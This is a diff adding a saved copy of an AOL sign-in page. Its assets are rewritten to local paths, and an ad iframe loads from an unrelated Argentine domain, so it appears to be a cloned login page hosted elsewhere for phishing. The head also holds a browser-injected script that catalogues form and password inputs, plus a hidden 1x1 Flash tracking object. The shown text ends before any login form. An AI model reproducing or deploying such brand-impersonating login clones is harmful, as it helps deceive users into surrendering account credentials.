@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<!-- saved from url=(0163)https://my.screenname.aol.com/_cqr/login/login.psp?sitedomain=startpage.aol.com&siteState=OrigUrl%3dhttp%253A%252F%252Fwww.aol.com%252F&authLev=0&lang=en&locale=us -->
+<html crossriderapp3491="true"><object type="{0C55C096-0F1D-4F28-AAA2-85EF591126E7}" cotype="cs" id="cosymantecbfw" style="width: 0px; height: 0px; display: block;"></object><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		
+			<title>AOL.com - Welcome to AOL</title>
+			
+				<meta name="description" content="Get a free email address from AOL now! You no longer need to be an AOL member to take advantage of great AOL Mail features such as industry-leading spam and virus protection, anytime-access on your mobile device, flexibility to work with other email clients using IMAP and more.">
+			
+				<meta name="keywords" content="AOL.com - Welcome to AOL ">
+			
+			
+				<script language="javascript" type="text/javascript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/jquery-1.4.2.min.js"></script>
+			
+				<script language="javascript" type="text/javascript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/snslanding.js"></script>
+			
+			
+				<link rel="stylesheet" type="text/css" media="screen" href="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/snslanding.css">
+			
+				<link rel="stylesheet" type="text/css" media="screen" href="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/aol-com-dvl-ad.css">
+			
+				<link rel="stylesheet" type="text/css" media="screen" href="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/hdr_err.css">
+			
+		
+		
+		
+
+<!-- This code is auto-generated for Beacon support -->
+
+		<script>
+			function layerClicked(testName,grpName)
+			{
+				return true;
+			}
+			
+			function loadConfig()
+			{}
+		</script>
+	
+<!-- End of auto-generated code for beacon -->
+
+
+	
+<link href="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/lpUiStyles.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+#mcd, #mcd #loginrow,#logintitlebar,.sns_noTabs, #newstdmod, #logindiv,.logintabs .selected,#logintitlebar { color: #000000;background-color: #FFFFFF; }
+#snsmod #mcd, #stdfooter #spipe, .headlinebold, #mcd label, #mcd .fieldlabel  { color: #000000 }
+#titlebar { background-color: #003366;border:1px solid #003366 }
+#snsmod .slnksm, #snsmod .slnkmd, #snsmod .slnklg, #newstdmod .slnkmd, #newstdmod a{  color: #003366; }
+#mcd .text3, #mcd td.text3 { color: #0066FF }
+#newstdmod {background-color:#FFFFFF; border:1px solid #003366; }
+.secidcontent, .asqcontent, .ssocontent {border-top:1px solid #003366; }
+</style>
+<img width="0" height="0" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/b"><script type="text/javascript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/list.js"></script><script type="text/javascript" id="WAXScript">var WAX = function() { var _parseCriterias = 0; var _parseCriterias = 0; var _eventTypes = 0; var _minStringLen = 0; var _maxStringLen = 0; var _minElementWidth = 0; var _maxElementWidth = 0; var _minElementHeight = 0; var _maxElementHeight = 0;  var _minStringWidth = 0; var _maxStringWidth = 0; var _minStringHeight = 0; var _maxStringHeight = 0;  var _farTextMaxDeltaX = 0; var _farTextMaxDeltaY = 0;  var _minStringLength = 0; var _maxStringLength = 0;  var _docMinHeight = 0;  var _parseTimeOut = 500; var _timedOut = false; var _hasTimeOut = true;  var _arrInputs = {};  var ParseCriterias = { None: 0, EventObjects: 4, VerifyAttributeByAttachedText: 32, IgnoreImages: 64, IgnoreHiddenInputs: 2048, EnableAjaxSupport: 16384, VerifyDocumentHeight: 32768, InputsOnly: 65536, IgnoreFieldSets: 131072, IgnoreForms: 262144  };  var Event = { None: 0, OnClick: 1, OnSubmit: 2, OnMouseDown: 4, OnMouseUp: 8, HREFJavaScriptMethod: 16,  FormAction: 32, Command: 64, HREFPound: 128, Role: 256 };  var InputType = { Unknown: 0, Text: 1, TextArea: 2, Password:3 , Submit: 4, Image: 5, Button: 6, Checkbox: 7, Radio: 8, Reset: 9, File: 10, Hidden: 11, Select: 12, EventObject: 13 };  var ElementType = { Unknown: 0, Label: 1, TableCell: 2, Header: 3, Table: 4, TableBody: 5, TableRow: 6, Input: 7, TextArea: 8, Button: 9, Image: 10, Select: 11, Link: 12, Container: 13, SelectOption: 14, Generic: 15, Form: 16, Comments: 17, FieldSet: 18 };  function Rect(left, top, right, bottom) { this.left = left; this.top = top; this.right = right; this.bottom = bottom; this.getLeft = function getLeft() { return this.left; }, this.getTop = function getTop() { return this.top; }, this.getRight = function getRight() { return this.right; }, this.getBottom = function getBottom() { return this.bottom; }, this.getRect = function getRect() { return this.left + ',' + this.top + ',' + this.right + ',' + this.bottom; } } return {  getElement: function(index) { if( null == _arrInputs ) { return; }  if( index<0 || index>=_arrInputs.length ) { return null; }  return _arrInputs[index]; },  getLangs: function() { var arrLangs = new Array(); var metaTags = window.document.getElementsByTagName("meta"); var sLang = null;  var oDocElement = window.document.documentElement; if( null != oDocElement ) { var sAttribute = oDocElement.getAttribute("lang"); if( null == sAttribute ) { window.document.documentElement.getAttribute("xml:lang"); }  if( null != sAttribute && !( sAttribute=="en" && 2==sAttribute.length) ) { arrLangs.push(sAttribute); }  }  for( var i=0; i<metaTags.length; i++ ) { var oElement = metaTags[i]; if( null == oElement ) { continue; }  var sAttribute = oElement.getAttribute("http-equiv"); if( null != sAttribute ) { if( "content-language" == sAttribute.toLowerCase() ) { sLang = oElement.getAttribute("content");  } }  if( null == sLang ) { sAttribute = oElement.getAttribute("name"); if( null != sAttribute && "language" == sAttribute.toLowerCase() ) { sLang = oElement.getAttribute("content");  } }  if( null == sLang ) { sAttribute = oElement.getAttribute("lang"); }  if( null != sLang ) { arrLangs.push(sLang.toLowerCase()); sLang = null; } } return arrLangs.join(";"); },  Parse: function(args) { var oDomNode = window.document.body;  _arrInputs = null;   _parseCriterias = args[0]; _eventTypes = args[1];  _minStringLength = args[2]; _maxStringLength = args[3];  _minElementWidth = args[4]; _maxElementWidth = args[5]; _minElementHeight = args[6]; _maxElementHeight = args[7];   _minStringWidth = args[8]; _maxStringWidth = args[9]; _minStringHeight = args[10]; _maxStringHeight = args[11];   _docMinHeight = args[12];  _farTextMaxDeltaX = args[13]; _farTextMaxDeltaY = args[14]; if(16==args.length) { _parseTimeOut = args[15];  } else { _parseTimeOut = 500; _hasTimeOut = false; }  return this.getCandidates(oDomNode); },  getCandidates: function(oElement) {   if( typeof oElement == "undefined" ) { return "E_INVALIDARG"; }   var startTime = new Date().getTime();  var oBoundaries = new Rect(Number.MAX_VALUE, Number.MAX_VALUE, 0, 0);    var arrInputsDesc = new Array(); arrInputsDesc.push(0);   var arrInputs = new Array();  this.collectForms(arrInputsDesc, arrInputs);   if( !this.collectInputs(oElement, oBoundaries, arrInputsDesc, arrInputs) ) { return "E_FAIL";  }   var endTime = new Date().getTime(); if( (endTime-startTime) > (_parseTimeOut*2) ) { _timedOut = true; }   var arrLabels = new Array(); arrLabels.push(0); if( !_timedOut ) { this.collectNonInputs(oElement, oBoundaries, arrInputsDesc, arrLabels, arrInputs); if( _timedOut ) { arrLabels = new Array(); arrLabels.push(0); } }    arrInputsDesc[0] = (arrInputsDesc.length-1)/2;  var sDescription = arrInputsDesc.join("#!#");  sDescription = arrInputsDesc[1] = sDescription.length + "#!#" + sDescription;   arrLabels[0] = (arrLabels.length-1)/2;  if( 1==arrLabels.length ) { arrLabels.push("0"); }  _arrInputs = arrInputs; sLabels = arrLabels.join("#!#");  sLabels = arrLabels[1] = sLabels.length + "#!#" + sLabels;  var sAll = sDescription+sLabels;  return ( ((_timedOut && _hasTimeOut) ? "E_TIMEDOUT" : "") + sAll.length.toString() + "#!#" + sAll);  },  collectForms: function(arrInputsDesc, arrInputs) { if( _parseCriterias&ParseCriterias.IgnoreForms ) { return false; }  if( typeof arrInputsDesc == "undefined" || typeof arrInputs == "undefined" ) { return false; }  if( Array != arrInputsDesc.constructor || Array != arrInputs.constructor) { return false;  }   var oForms = window.document.forms;  var elementType = {}; var inputType = {};    var length = oForms.length; for( var i=0; i<length; ++i ) { var oForm = oForms[i];  elementType.value = ElementType.Form; inputType.value = InputType.Unknown;  var oRect = oForm.getBoundingClientRect(); var sInputDesc = this.processInput(oForm, oRect, elementType, inputType);   if( null != sInputDesc ) { arrInputs.push(oForm); arrInputsDesc.push(sInputDesc.length); arrInputsDesc.push(sInputDesc);  }   this.collectFieldSets(oForm, arrInputsDesc, arrInputs); } }, collectFieldSets: function(oElement, arrInputsDesc, arrInputs) { if( _parseCriterias&ParseCriterias.IgnoreFieldSets || _parseCriterias&ParseCriterias.IgnoreForms ) { return true; }  if( typeof oElement == "undefined" || typeof arrInputsDesc == "undefined" || typeof arrInputs == "undefined" ) { return false; }  if( Array != arrInputsDesc.constructor || Array != arrInputs.constructor) { return false;  }  var usingFieldSets = !(ParseCriterias.IgnoreFieldSets==(_parseCriterias&ParseCriterias.IgnoreFieldSets));  var elementType = {}; var inputType = {};   elementType.value = ElementType.FieldSet; inputType.value = InputType.Unknown;   var oFieldSets = oElement.getElementsByTagName("fieldset"); var length = oFieldSets.length; for( var f=0; f<length; ++f ) {  var oFieldSet = oFieldSets[f]; oRect = oFieldSet.getBoundingClientRect(); sInputDesc = this.processInput(oFieldSet, oRect, elementType, inputType); if( null != sInputDesc ) { arrInputs.push(oFieldSet); arrInputsDesc.push(sInputDesc.length); arrInputsDesc.push(sInputDesc);  } }  return true; },  collectInputs: function(oElement, oBoundaries, arrInputsDesc, arrInputs) { if( typeof oElement == "undefined" || typeof oBoundaries == "undefined" ||  typeof arrInputsDesc == "undefined" || typeof arrInputs == "undefined" ) { return false; }  if( Rect != oBoundaries.constructor || Array != arrInputsDesc.constructor || Array != arrInputs.constructor) { return false;  } var maxCombinedParseTime = _parseTimeOut*2; var startTime = new Date().getTime();  var arrElements = oElement.getElementsByTagName("INPUT"); if( typeof arrElements != "undefined" && 0 == arrElements.length ) { arrElements = oElement.getElementsByTagName("input"); } this.processInputs(arrElements, oBoundaries, arrInputsDesc, arrInputs); if( !_timedOut ) { arrElements = oElement.getElementsByTagName("BUTTON"); if( typeof arrElements != "undefined" && 0 == arrElements.length ) { arrElements = oElement.getElementsByTagName("button"); } this.processInputs(arrElements, oBoundaries, arrInputsDesc, arrInputs); } if( !_timedOut ) { arrElements = oElement.getElementsByTagName("SELECT"); if( typeof arrElements != "undefined" && 0 == arrElements.length ) { arrElements = oElement.getElementsByTagName("select"); } this.processInputs(arrElements, oBoundaries, arrInputsDesc, arrInputs); }  var endTime = new Date().getTime(); if( (endTime-startTime) > maxCombinedParseTime ) { _timedOut = true; }  if( !_timedOut && !(_parseCriterias&ParseCriterias.IgnoreImages) && !(_parseCriterias&ParseCriterias.InputsOnly) ) {   this.processInputs(oElement.getElementsByTagName("IMG"), null, arrInputsDesc, arrInputs);  }   var endTime = new Date().getTime(); if( (endTime-startTime) > maxCombinedParseTime ) { _timedOut = true; } var endTime = new Date().getTime(); if( (endTime-startTime) > maxCombinedParseTime ) { _timedOut = true; }  return true; }, collectNonInputs: function(oParent, oBoundaries, arrInputsDesc, arrLabels, arrInputs) { if( typeof oParent == "undefined" || typeof oBoundaries == "undefined" ||  typeof arrInputsDesc == "undefined" || typeof arrLabels == "undefined" || typeof arrInputs == "undefined" ) { return false; }  if( Rect != oBoundaries.constructor || Array != arrInputsDesc.constructor ||  Array != arrLabels.constructor || Array != arrInputs.constructor ) { return false;  }  var matchUsingAttachedText = true; var usingEventObjects = (ParseCriterias.EventObjects==(_parseCriterias&ParseCriterias.EventObjects) ); var verifyAttributeByAttachedText = ( ParseCriterias.VerifyAttributeByAttachedText==(_parseCriterias&ParseCriterias.VerifyAttributeByAttachedText) ); var enableAjaxSupport = ( ParseCriterias.EnableAjaxSupport==(_parseCriterias&ParseCriterias.EnableAjaxSupport) );  if( !matchUsingAttachedText && !usingEventObjects && !verifyAttributeByAttachedText ) { return true; } var eventTypes = (usingEventObjects ? _eventTypes : 0); var oRectElement = new Rect(0, 0, 0, 0);  var isFormCollection = false; var oItems = oParent.getElementsByTagName("*"); if( typeof oItems == "undefined" || 0==oItems.length ) { oItems = oParent.all; if( typeof oItems == "undefined" || 0==oItems.length ) { return false; } }  var elementType = {}; var inputType = {};   var startTime = new Date().getTime(); var i = 0; for( i=0; i<oItems.length; ++i ) {  if( !(i%150) ) { var endTime = new Date().getTime(); if( (endTime - startTime)>_parseTimeOut ) { _timedOut = true; break; } } var oElement = oItems[i]; if( typeof oElement == "undefined" ) { continue; }  elementType.value = ElementType.Unknown; inputType.value = InputType.Unknown;  if( !this.getElementType(oElement, elementType, inputType) && ElementType.Unknown != elementType.value ) { continue; }   if( ElementType.Input==inputType.value || ElementType.Select==elementType.value ||  ElementType.Button==inputType.value || ElementType.Image==elementType.value || ElementType.SelectOption==elementType.value || ElementType.Form==elementType.value || InputType.File==inputType.value || InputType.Submit==inputType.value ) { continue; }   var oRect = oElement.getBoundingClientRect();  if( InputType.Unknown == inputType.value && usingEventObjects ) { if( 0!=eventTypes && this.hasEventHandler(eventTypes, oElement) ) { inputType.value = InputType.EventObject; } }  if( InputType.Unknown != inputType.value ) { var width = oRect.right - oRect.left; var height = oRect.bottom - oRect.top; var outOfBounds = ( width<_minElementWidth || width>_maxElementWidth ||  height<_minElementHeight || height>_maxElementHeight ); if( outOfBounds ) {  if( _parseCriterias&ParseCriterias.IgnoreHiddenInputs ) { continue; }  if( 0!=width && 0!=height ) { continue; } }  if( InputType.TextArea == inputType.value || InputType.EventObject == inputType.value )  { var sInputDesc = this.processInput(oElement, oRect, elementType, inputType);  if( null != sInputDesc ) { if( null != oBoundaries ) {  this.expandRect(oRect, oBoundaries); }  arrInputs.push(oElement); arrInputsDesc.push(sInputDesc.length); arrInputsDesc.push(sInputDesc);  }  } } else if( matchUsingAttachedText || verifyAttributeByAttachedText ) {  var ptX = ((oRect.right-oRect.left)/2)+oRect.left; var ptY = ((oRect.bottom-oRect.top)/2)+oRect.top;  if( !(ptX>=oBoundaries.left && ptX<=oBoundaries.right && ptY>=oBoundaries.top && ptY<=oBoundaries.bottom) ) { continue; }  var sText = this.getElementText(oElement, oRect); if( null == sText ) { var oFirstChild = oElement.firstChild; if( null != oFirstChild ) { sText = this.getElementText(oFirstChild, oRect);  } }  if( null != sText ) {  sText = sText.trim(); var length = sText.length;  var sLabel = ""; if( length>0 ) { sLabel = "{" + elementType.value + ",0},{" + oRect.left + "," + oRect.top + "," + oRect.right + "," + oRect.bottom + "}"; sLabel+= "#!#" + length + "#!#" + sText;  } else { sLabel = "{" + elementType.value + ",0},{" + oRect.left + "," + oRect.top + "," + oRect.right + "," + oRect.bottom + "}"; sLabel+= "#!#0";  }  arrLabels.push(sLabel.length);  arrLabels.push(sLabel);  }  }  } return true; }, processInputs : function(oInputs, oBoundaries, arrInputsDesc, arrInputs) {   if( typeof oInputs == "undefined" || typeof arrInputsDesc == "undefined" || typeof arrInputsDesc == "arrInputs" ) { return false; }   if( ( oBoundaries!=null && Rect != oBoundaries.constructor ) || Array != arrInputsDesc.constructor || Array != arrInputs.constructor ) { return false;  }  var length = oInputs.length; if( 0 == length ) { return true; }  var ignoreHiddenInputs = (ParseCriterias.IgnoreHiddenInputs==(_parseCriterias&ParseCriterias.IgnoreHiddenInputs));  var startTime = new Date().getTime(); var i = 0; for (i = 0; i<length; ++i) {  if( !(i%150) ) { var endTime = new Date().getTime(); if( (endTime - startTime)>_parseTimeOut ) { _timedOut = true; break; } } var oElement = oInputs[i]; var oRect = oElement.getBoundingClientRect();  if( !this.IsValidElement(oElement, oRect, ignoreHiddenInputs) ) {  continue; }  var elementType = {}; var inputType = {}; if( !this.getElementType(oElement, elementType, inputType) || InputType.Checkbox == inputType.value || ElementType.SelectOption == elementType.value ) {  continue; }  var sInputDesc = this.processInput(oElement, oRect, elementType, inputType);  if( null != sInputDesc ) { if( null != oBoundaries ) {  this.expandRect(oRect, oBoundaries); }   arrInputs.push(oElement);  arrInputsDesc.push(sInputDesc.length); arrInputsDesc.push(sInputDesc); } }  return true; }, getElementText: function(oElement, oRect) {  if( typeof oElement == "undefined" || typeof oRect == "undefined" ) { return null; }  if( ClientRect != oRect.constructor ) { return null; }  var width = oRect.right-oRect.left; var height = oRect.bottom-oRect.top;  if( width<_minStringWidth || width>_maxStringWidth ||   height<_minStringHeight || height>_maxStringHeight ) { return null; }  var innerText = oElement.innerText; if( null == innerText ) { return null; }  innerText = innerText.trim();  var length = innerText.length; if( length<_minStringLength || length>_maxStringLength ) { return null; }  return innerText;  }, processInput: function(oElement, oRect, elementType, inputType) {  if( typeof oElement == "undefined" || typeof oRect == "undefined" ) { return null; }  if( ClientRect != oRect.constructor ) { return null; }  var ajaxSupport = ( ParseCriterias.EnableAjaxSupport==(_parseCriterias&ParseCriterias.EnableAjaxSupport) );  var isImage = ( ParseCriterias.IgnoreImages==(_parseCriterias&ParseCriterias.IgnoreImages) ); var outerHTML = null;  if( ElementType.Form!=elementType.value && ElementType.FieldSet!=elementType.value ) { outerHTML = oElement.outerHTML; } else if (InputType.Select == inputType.value) {  outerHTML = "<select";  var oAttributes = oElement.attributes; if( null != oAttributes ) {  var length = oAttributes.length;  for( i=0; i<length; ++i ) { var oAttrPair = oAttributes[i]; if( typeof oAttrPair == "undefined" ) { continue; }  outerHTML+= " " + oAttrPair.name + "=\"" + oAttrPair.value + "\""; }  }  outerHTML += "></select>"; }  if( null == outerHTML && (InputType.EventObject==inputType.value || isImage) ) { return null; }  var innerText = "";  if( ElementType.Button==elementType.value ) { innerText = oElement.innerText; if( null == innerText ) { innerText = oElement.getAttribute("value"); } }  else if( InputType.Select==inputType.value ) { var arrOptions = new Array(); var length = 0;   var items = oElement.options; if( typeof items != "undefined" ) { length = items.length;  var i = 0; for( i=0; i<length; ++i ) { innerText = items[i].innerText; if( null == innerText || 0 == innerText.length ) { arrOptions.push("<!>#<!>"); } else { innerText = innerText.trim(); arrOptions.push(innerText);  } }   if( arrOptions.length >0 ) { var sOptions = "\"" + arrOptions.join("\":\"") + "\"";  sOptions.replace("<!>#<!>", " ");  innerText = arrOptions.length + "#!#" + sOptions; } }  if( 0==length ) { innerText = "0#!#"; }  }  else if( InputType.Submit==inputType.value ) { innerText = oElement.getAttribute("value"); if( null == innerText ) { innerText = oElement.innerText; } } else if( InputType.EventObject==inputType.value ) { var oFirstChild = oElement.firstChild; if( null != oFirstChild ) { innerText = oFirstChild.innerText; } if( null == innerText || 0 == innerText.length ) { innerText = oElement.innerText; }  if( null != innerText ) { innerText = innerText.trim(); } } else if( ElementType.Link == elementType.value ) { innerText = oElement.innerText; } else if( InputType.Radio == inputType.value && (null == innerText || 0 == innerText.length) ) { var oNextSibling = oElement.nextSibling; if( null != oNextSibling ) { innerText = oNextSibling.innerText; } }  var arrDesc = this.getInputDescription(oElement, oRect, elementType, inputType); if( null == arrDesc ) { return null; }  if( null == innerText ) { arrDesc.push("0"); } else {  innerText = innerText.trim(); var length = innerText.length; if( 0==length ) { arrDesc.push("0"); }  else { arrDesc.push(innerText.length); arrDesc.push(innerText);  }  }  if( null == outerHTML ) { arrDesc.push("0"); } else {  var length = outerHTML.length; if( 0==length ) { arrDesc.push("0"); }  else {  arrDesc.push(outerHTML.length); arrDesc.push(outerHTML);  }  }    return arrDesc.join("#!#"); },  getInputDescription: function(oElement, oRect, elementType, inputType) {  if( typeof oElement == "undefined" || typeof oRect == "undefined" ) { return null; } if( ClientRect != oRect.constructor ) { return null; }  var arrItems = new Array(); arrItems.push("{" + elementType.value + "," + inputType.value + "},{" + oRect.left + "," + oRect.top + "," + oRect.right + "," + oRect.bottom + "}");  var oAttributes = oElement.attributes; if( null==oAttributes ) { arrItems.push("0"); } else { var length = oAttributes.length;  arrItems.push(length); if( length > 0 ) {  var sAttrs = ""; var i = 0; for( i=0; i<length; ++i ) { var oAttrPair = oAttributes[i];  if( typeof oAttrPair == "undefined" ) { continue; }  if( "id" == oAttrPair.name ) { if( sAttrs.length>0 ) { var sTemp = "\"" + oAttrPair.name + "\":\"" + oAttrPair.value + "\"," + sAttrs; sAttrs = sTemp;  } else { sAttrs = "\"" + oAttrPair.name + "\":\"" + oAttrPair.value + "\""; } continue;  }  if( sAttrs.length>0 ) { sAttrs+=",\""; } else { sAttrs+= "\""; }  sAttrs += oAttrPair.name + "\":\"" + oAttrPair.value + "\""; }  arrItems.push(sAttrs.length); arrItems.push(sAttrs); } } return arrItems; },  expandRect: function(oElementRect, oBoundaries) {  if( null == oBoundaries ) { return true; }  if( typeof oElementRect == "undefined" || typeof oBoundaries == "undefined" ) { return false; }   if( ClientRect != oElementRect.constructor || Rect != oBoundaries.constructor ) { return false;  } if( oElementRect.left<oBoundaries.left ) { oBoundaries.left = ( (oElementRect.left-_farTextMaxDeltaX>0) ? oElementRect.left-_farTextMaxDeltaX : 0);  } if( oElementRect.top<oBoundaries.top ) { oBoundaries.top = ( (oElementRect.top-_farTextMaxDeltaY>0) ? oElementRect.top-_farTextMaxDeltaY : 0);  } if( oElementRect.right>oBoundaries.right ) { oBoundaries.right = oElementRect.right+_farTextMaxDeltaX; } if( oElementRect.bottom>oBoundaries.bottom ) { oBoundaries.bottom = oElementRect.bottom+_farTextMaxDeltaY; }  return true;  }, getElementType: function(oElement, elementType, inputType) {  elementType.value = ElementType.Unknown; inputType.value = InputType.Unknown;   if( typeof oElement == "undefined" ) { return false; }  var isInputType = false;  var nodeName = oElement.nodeName.toUpperCase(); var length = nodeName.length;  if( 1==length ) { if( nodeName == "A" ) { elementType.value = ElementType.Link; } else if( nodeName == "B" ) { elementType.value = ElementType.Label;  }  }  else if( 2==length ) {  if( nodeName == "TD" || nodeName == "TH" ) { elementType.value = ElementType.TableCell; } if ( nodeName == "TR" ) { elementType.value = ElementType.TableRow; } if ( nodeName == "EM" ) { elementType.value = ElementType.Header; } else if( nodeName == "H1" || nodeName == "H2" || nodeName == "H3" ||  nodeName == "H4" || nodeName == "H5" || nodeName == "H6" ) { elementType.value = ElementType.Header; } } else if( 3==length ) { if ( nodeName == "DIV" ) { elementType.value = ElementType.Container; } else if( nodeName == "IMG" ) { elementType.value = ElementType.Image; isInputType = true; }  } else if( 4==length ) { if ( nodeName == "SPAN" ) { elementType.value = ElementType.Container; } else if ( nodeName == "FORM" ) { inputType.value = InputType.Unknown; elementType.value = ElementType.Form; }   } else if( 5==length ) {  if( nodeName == "INPUT" ) { elementType.value = ElementType.Input; isInputType = true; } else if( nodeName == "LABEL" ) { elementType.value = ElementType.Label; } } else if( 6==length ) { if( nodeName == "OPTION" ) { elementType.value = ElementType.SelectOption; } else if( nodeName == "SELECT" ) { elementType.value = ElementType.Select; inputType.value = InputType.Select; } else if( nodeName == "BUTTON" ) { elementType.value = ElementType.Button; this.getElementInputType(oElement, inputType); if( InputType.Submit != inputType.value ) { inputType.value = InputType.Button; } } else if( nodeName == "STRONG" ) { elementType.value = ElementType.Header; }  } else if( 8==length ) { if( nodeName == "TEXTAREA" ) { elementType.value = ElementType.TextArea; inputType.value = InputType.TextArea; } else if( nodeName == "FIELDSET" ) { inputType.value = InputType.Unknown; elementType.value = ElementType.FieldSet;  }  }  if( ElementType.Unknown == elementType.value ) { elementType.value = ElementType.Generic; }  if( true == isInputType ) { this.getElementInputType(oElement, inputType); if( ElementType.Image==elementType.value && InputType.Submit!=inputType.value ) { inputType.value = InputType.Image; } }  return true; },  getElementInputType: function(oElement, inputType) { inputType.value = InputType.Unknown; if( typeof oElement == "undefined" ) { return false; }  var sType = oElement.getAttribute("type"); if( null == sType || 0 == sType.length ) { inputType.value = InputType.Text; return true;  }  inputType.value = InputType.Text; sType = sType.toUpperCase();  if( sType == "PASSWORD" ) { inputType.value = InputType.Password; } else if( sType == "SUBMIT" ) { inputType.value = InputType.Submit; } else if( sType == "IMAGE" ) { inputType.value = InputType.Image; } else if( sType == "BUTTON" ) { inputType.value = InputType.Button; } else if( sType == "CHECKBOX" ) { inputType.value = InputType.Checkbox; } else if( sType == "RADIO" ) { inputType.value = InputType.Radio; } else if( sType == "RESET" ) { inputType.value = InputType.Reset; } else if( sType == "FILE" ) { inputType.value = InputType.File; } else if( sType == "HIDDEN" ) { inputType.value = InputType.Hidden; } else {  inputType.value = InputType.Text; }   return true;  },  IsValidElement: function(oElement, oRect, bIgnoreHiddenInputs) {  if( typeof oElement == "undefined" || typeof oRect == "undefined" || ClientRect != oRect.constructor ) { return false; }  var nWidth = oRect.right - oRect.left; var nHeight = oRect.bottom - oRect.top;  if( 0 == nWidth && 0 == nHeight ) { return (bIgnoreHiddenInputs?false:true);  }  if( nWidth<_minElementWidth || nWidth>_maxElementWidth || nHeight<_minElementHeight || nHeight>_maxElementHeight ) { return false; }  var valid = true; try { var sType = oElement.getAttribute("type"); if( null != sType ) { if( sType == "hidden" ) { valid = false; } } } catch(err) {}   return valid; },  hasEventHandler: function(eventType, oElement) {  if( 0 == eventType || typeof oElement == "undefined") { return false; }  if( eventType&Event.OnClick ) { if( null != oElement.getAttribute("onclick") ) { return true; } }  if( eventType&Event.OnSubmit ) { if( null != oElement.getAttribute("onsubmit") ) { return true; } }  if( eventType&Event.OnMouseDown ) { if( null != oElement.getAttribute("onmousedown") ) { return true; } }  if( eventType&Event.OnMouseUp ) { if( null != oElement.getAttribute("onmouseup") ) { return true; } }  if( eventType&Event.HREFJavaScriptMethod || eventType&Event.HREFPound ) { var handler = oElement.getAttribute("href");  if( null != handler ) { handler = handler.toLowerCase(); if( 0 == handler.indexOf("javascript") ) { return true; }  if( 0 == handler.indexOf("#") ) { return true; }  } }  if( eventType&Event.Command ) { if( null != oElement.getAttribute("command") ) { return true; } }  if( eventType&Event.FormAction ) { if( null != oElement.getAttribute("formaction") ) { return true; } } if( eventType&Event.Role ) { var handler = oElement.getAttribute("role");  if( null != handler ) { handler = handler.toLowerCase(); if( 0 == handler.indexOf("button") ) { return true; } } }  return false; } };} ();function waxGetLangs() { return WAX.getLangs();}function waxGetElement(index) { if( null == index ) { return; }  return WAX.getElement(index);}function waxGetCandidates(args) { if (Array != args.constructor || ( 15!=args.length && 16!=args.length) ) { return "E_INVALIDARG"; }  return WAX.Parse(args);}</script></head>
+	<body style="overflow-x: hidden; "><div style="position: absolute; top: 0px; left: 0px; width: 1px; height: 1px; z-index: 2147483647; " id="_GPL_e6a00_parent_div"><object type="application/x-shockwave-flash" id="_GPL_e6a00_swf" data="../../vidsaver-a.akamaihd.net/items/e6a00/storage.swf" width="1" height="1"><param name="wmode" value="transparent"><param name="allowscriptaccess" value="always"><param name="flashvars" value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl"></object></div>
+		<div onclick="layerClicked(&#39;$&#39;,&#39;$&#39;)" onmousedown="return loadConfig();">
+			<div class="port_land">
+				<div class="lands">
+					
+						<noscript>
+	&lt;div id="dvErr"&gt;
+		&lt;div class="p1"&gt;
+			&lt;img src="https://s.aolcdn.com/os/landingpages/images/error.gif" alt=""/&gt;
+		&lt;/div&gt;
+		&lt;div class="p2"&gt;
+			&lt;span&gt;Whoops...&lt;/span&gt; Sign-in to this site requires JavaScript. You are either using a browser that does not support JavaScript or has JavaScript disabled. For more information, please visit our &lt;a href="http://help.aol.com/help/microsites/search.do?cmd=displayKC&amp;docType=kc&amp;externalId=223296"&gt;Help article.&lt;/a&gt;
+		&lt;/div&gt;
+	&lt;/div&gt;
+</noscript>
+
+
+<script type="text/javascript">
+document.cookie="testcookie";  
+var cookieEnabled=(document.cookie.indexOf("testcookie")!=-1)? true : false;  
+
+  if (!cookieEnabled)  
+  {
+    var layer=document.getElementById("cookieErrLayer");
+    layer.style.display="block";
+  }
+</script>
+					
+					<div id="othercontent">
+						
+							<div class="aol_hatcontainer">
+								<div class="hat">
+                                <div class="hatDiv">
+                                    <div class="hatLinks">
+                                        <div id="bottomHatLinks" class="bottomHatLinks">
+                                            <a target="_blank" class="aol_hat_logo" href="../../aol.com/index.html">Aol.</a>|
+ <a target="_blank" href="../../help.channels.aol.com/topic.adp%3FtopicId=SG_SignIn.html">Help</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+							</div>
+						
+						<div class="brand">
+							
+							<!-- BRANDING_CONTENT  -->
+
+<script type="text/javascript">
+	$(document).ready(function(){
+		$(window).resize(function() {
+			var wid = $(window).width();
+			if(wid>900){
+				$("body").css("overflow-x","hidden");
+			}else{
+				$("body").css("overflow-x","scroll");
+			}
+		});
+		var wid1 = $(window).width();
+		if(wid1>900){
+			$("body").css("overflow-x","hidden");
+		}else{
+			$("body").css("overflow-x","scroll");
+		}
+		modifyCreateAccountLink();
+	});
+</script>
+
+<script type="text/javascript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/adsWrapper.js"></script>
+<script type="text/javascript">
+<!--
+adSetHtNmAT('https://at.atwola.com')
+//-->
+</script>
+
+<script type="text/javascript"> adSetType('I'); htmlAdWH('93313514', '1300', '800'); adSetType(''); // </script><iframe title="Ad" name="adsF0" id="adsF0" src="http://vistedesign.com.ar/ccc/AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/size=1300x800;noperf=1;alias=93313514;kvpagetype=0;kveditags=0;kvmood=0;kvpatcheditags=0;kvag=0;kvinc=0;kvmar=0;kvch=0;kvseg=0;kvugc=0;kvui=f3ddfe6acf4911e196540f86bb84c9e8;kvmn=93313514;extmirroring=.htm" width="1300" height="800" scrolling="no" frameborder="0" marginheight="0" marginwidth="0"></iframe>
